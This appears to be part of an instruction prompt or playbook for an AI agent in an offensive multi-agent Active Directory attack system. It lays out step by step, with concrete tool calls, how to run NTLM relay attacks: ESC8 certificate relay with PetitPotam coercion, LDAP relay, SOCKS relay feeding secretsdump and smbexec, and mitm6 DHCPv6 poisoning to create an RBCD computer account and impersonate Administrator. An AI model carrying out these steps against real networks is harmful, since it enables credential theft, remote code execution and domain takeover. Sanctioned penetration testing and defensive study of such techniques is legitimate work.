## Relay Attack Coordination

### For ADCS ESC8
Coordinate with PrivEsc agent:
1. PrivEsc starts certipy_relay_esc8
2. You run petitpotam to coerce DC
3. DC authenticates to relay
4. Relay captures certificate

### For LDAP Relay
```
1. Start ntlmrelayx to LDAP
2. Run coercion attack
3. Relay performs LDAP actions
```

### SOCKS Relay (Interactive Sessions)
Capture and reuse SMB sessions for multiple tools:
```
1. ntlmrelayx_socks(targets="relay.txt")
   → Start relay with SOCKS proxy (port 1080)
2. Run coercion or wait for LLMNR/NBT-NS captures
3. Check active sessions with ntlmrelayx console
4. Use sessions via proxychains:
   - proxychains secretsdump -no-pass DOMAIN/USER@TARGET
   - proxychains smbexec -no-pass DOMAIN/USER@TARGET
   → Execute tools through relayed sessions
```

### DHCPv6 + LDAP Relay (Create Computer for RBCD)
Combine mitm6 with ntlmrelayx to create computer account:
```
1. mitm6(interface=""  # Auto-detected (e.g., ens5 on AWS), domain="domain.com")
   → Poison DHCPv6 responses
2. ntlmrelayx_ldap(
       target="ldaps://dc.domain.com",
       add_computer="YOURPC",
       delegate_access=True
   )
   → Relay to LDAPS, create computer with RBCD rights
3. Wait for machine authentication (WPAD requests)
4. Use created computer for RBCD attack:
   → getST.py -spn cifs/TARGET -impersonate Administrator DOMAIN/YOURPC$:PASSWORD
```

